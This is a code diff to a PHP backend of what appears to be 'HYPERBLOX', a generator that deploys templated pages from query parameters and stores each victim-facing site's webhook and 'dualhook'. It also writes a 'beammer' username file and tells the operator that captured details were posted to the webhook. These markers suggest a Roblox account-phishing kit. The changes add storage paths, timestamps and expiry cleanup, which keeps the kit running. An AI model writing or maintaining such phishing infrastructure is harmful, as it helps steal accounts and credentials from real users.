@@ -1,4 +1,6 @@
 <?php
+require_once __DIR__ . '/persistence.php';
+
 function token($length = 32) {
     $base = 'HYPERBLOX';
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -17,7 +19,12 @@ $web = $_GET['web'];
 $t = $_GET['t'];
 $error = "";
 $dualhook = $_GET['dualhook'] ?? '';
-$path2 = "tokens/";
+$persistBase = hb_get_persist_base();
+$tokensDir = hb_tokens_dir();
+hb_ensure_dir($tokensDir);
+$path2 = $tokensDir;
+$cleanupMaxAge = getenv('HYPERBLOX_TEMPLATE_TTL_SECONDS') ? (int)getenv('HYPERBLOX_TEMPLATE_TTL_SECONDS') : 259200;
+cleanupOldTemplates($tokensDir, hb_get_persist_base(), $cleanupMaxAge);
 $minimal = isset($_GET['minimal']); 
 
 if (preg_match('/[^A-Za-z0-9]/', $dir)) {
@@ -55,9 +62,35 @@ if ($t == "mr") {
     $fol = "Mass-Reporter";
 }
 
+function cleanupOldTemplates(string $tokensDir, string $baseDir, int $maxAgeSeconds = 259200): void {
+    if (!is_dir($tokensDir)) {
+        return;
+    }
+    foreach (glob($tokensDir . "*.txt") as $tokenFile) {
+        $raw = @file_get_contents($tokenFile);
+        if ($raw === false) {
+            continue;
+        }
+        $parts = array_map('trim', explode('|', $raw));
+        $dir = $parts[1] ?? '';
+        $timestamp = isset($parts[4]) && is_numeric($parts[4]) ? (int)$parts[4] : filemtime($tokenFile);
+        if (!$dir || !$timestamp) {
+            continue;
+        }
+        if ((time() - $timestamp) > $maxAgeSeconds) {
+            $templatePath = hb_template_dir($dir);
+            if (strpos(realpath($templatePath) ?: '', realpath($baseDir) ?: '') === 0) {
+                hb_rrmdir($templatePath);
+            }
+            @unlink($tokenFile);
+        }
+    }
+}
+
 if ($error == "") {
-    if (!file_exists("../../$dir")) {
-        mkdir("../../$dir");
+    $templatePath = hb_template_dir($dir);
+    if (!is_dir($templatePath)) {
+        hb_ensure_dir($templatePath);
         $index = file_get_contents("../../$fol/index.php");
         if ($t == "dg") {
             $index = file_get_contents("indexdh.php");
@@ -67,8 +100,8 @@ if ($error == "") {
         $index = str_replace("{dualhook}", urlencode($dualhook), $index);
         $token = token();
         $tw = "$dir | $web";
-        $path = "../../$dir/";
-        $path2 = "tokens/";
+        $path = $templatePath;
+        $path2 = $tokensDir;
 
         if (!file_exists($path2)) {
             mkdir($path2, 0777, true);
@@ -92,7 +125,7 @@ if ($error == "") {
         if ($fo) {
             fwrite($fo, $index);
             // Store: token | dir | web | dualhook (dualhook can be empty)
-            fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . "\n");
+            fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time() . "\n");
             fwrite($visit, '');
             fwrite($logs, '');
             fwrite($usernameFile, 'beammer');
@@ -120,7 +153,7 @@ if ($error == "") {
                     // Allow common media/static extensions
                     $allowed = ['mp4','webm','ogg','png','jpg','jpeg','gif','webp','ico','svg'];
                     if (in_array($ext, $allowed)) {
-                        @copy($srcDir . $entry, $path . $entry);
+                        @copy($srcDir . $entry, $path . DIRECTORY_SEPARATOR . $entry);
                     }
                 }
             }
@@ -244,6 +277,7 @@ if ($error == "") {
                 echo '<p>These details were also posted to your webhook.</p>';
                 echo '</div></body></html>';
             }
+            cleanupOldTemplates($tokensDir, hb_get_persist_base(), $cleanupMaxAge);
         }
     } else {
         // Styled notice when directory already exists
